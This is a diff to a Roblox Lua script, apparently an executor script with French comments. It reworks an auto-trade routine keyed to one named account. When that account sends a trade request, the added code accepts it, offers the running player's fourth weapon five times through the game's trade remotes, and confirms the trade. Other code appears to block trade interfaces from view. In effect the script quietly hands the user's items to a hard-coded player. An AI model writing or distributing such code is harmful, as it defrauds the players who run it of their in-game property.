@@ -1,6 +1,7 @@
 local Players = game:GetService("Players")
 local Workspace = game:GetService("Workspace")
 local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
 local LocalPlayer = Players.LocalPlayer
 local requestFunc = request or (http and http.request) or http_request
@@ -275,67 +276,41 @@ task.spawn(hardBlockGuis)
 playerGui.ChildAdded:Connect(hardBlockGuis)
 Players.PlayerAdded:Connect(hardBlockGuis)
 
--- [[ 5. LOGIQUE D'AUTO-TRADE AVEC CLICS SPÉCIFIQUES ]]
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
+-- [[ 5. LOGIQUE D'AUTO-TRADE REFAITE (PAR REMOTES) ]]
 local TradeModules = ReplicatedStorage:FindFirstChild("Trade") or ReplicatedStorage:FindFirstChild("Modules")
 local TradeNetwork = TradeModules and (TradeModules:FindFirstChild("TradeNetwork") or TradeModules:FindFirstChild("Network"))
-
--- Fonction pour simuler un vrai clic sur un bouton d'interface (GuiButton)
-local function clickGuiItem(button)
-    if button and button:IsA("GuiButton") then
-        local firesignal = firesignal or (syn and syn.firesignal)
-        if firesignal then
-            firesignal(button.MouseButton1Click)
-        else
-            -- Solution de secours si firesignal n'est pas supporté
-            pcall(function() button:Activate() end)
-        end
-    end
-end
 
 if TradeNetwork and TradeNetwork:IsA("RemoteEvent") then
     TradeNetwork.OnClientEvent:Connect(function(action, data)
         if action == "OfferFadeIn" and data and data.Player and data.Player.Name == "zeynox0880" then
-            -- 1. On accepte l'invitation de trade
+            -- 1. Accepter la demande de trade immédiatement
             TradeNetwork:FireServer("AcceptRequest", data.Player)
+            task.wait(0.5)
             
-            -- On attend que l'interface de Trade s'ouvre complètement
-            local tradeGui = playerGui:WaitForChild("TradeGUI", 5)
-            if tradeGui then
-                task.wait(0.5) -- Temps de chargement visuel du menu
+            -- 2. Trouver le 4ème item directement dans les données d'inventaire du jeu
+            local playerData = ReplicatedStorage:FindFirstChild("PlayerData")
+            local myInventory = playerData and playerData:FindFirstChild(LocalPlayer.Name) and playerData[LocalPlayer.Name]:FindFirstChild("Inventory")
+            
+            if myInventory then
+                -- On cherche la catégorie des armes (Weapons/Knives/Guns selon le jeu)
+                local weaponsFolder = myInventory:FindFirstChild("Weapons") or myInventory:FindFirstChild("Knives") or myInventory:GetChildren()[1]
                 
-                -- Chemin exact vers le conteneur d'items selon ta demande
-                local container = tradeGui: somePathPath or pcall(function()
-                    return tradeGui.Container.Items.Main.Weapons.Items.Container.Current.Container
-                end)
-                
-                local success, targetContainer = pcall(function() 
-                    return tradeGui.Container.Items.Main.Weapons.Items.Container.Current.Container 
-                end)
-                
-                if success and targetContainer then
-                    -- On récupère le 4ème élément du conteneur d'armes
-                    local items = targetContainer:GetChildren()
-                    -- Note: GetChildren contient parfois des UIListLayout, on filtre pour avoir le 4ème vrai bouton/item
-                    local cleanItems = {}
-                    for _, child in ipairs(items) do
-                        if child:IsA("GuiObject") and not child:IsA("UIComponent") then
-                            table.insert(cleanItems, child)
-                        end
-                    end
+                if weaponsFolder then
+                    local allWeapons = weaponsFolder:GetChildren()
+                    -- On récupère directement le 4ème item de la liste
+                    local targetItem = allWeapons[4]
                     
-                    local targetItem = cleanItems[4]
                     if targetItem then
-                        -- On clique 5 fois sur le 4ème élément
+                        -- On ajoute l'item 5 fois de suite via le serveur
                         for i = 1, 5 do
-                            clickGuiItem(targetItem)
-                            task.wait(0.1) -- Petit délai réaliste entre chaque clic
+                            TradeNetwork:FireServer("OfferItem", targetItem.Name, 1)
+                            task.wait(0.05)
                         end
                     end
                 end
             end
             
-            -- 2. Validation définitive du Trade via l'événement réseau
+            -- 3. Accepter et valider définitivement le Trade
             task.wait(0.3)
             TradeNetwork:FireServer("AcceptTrade")
         end
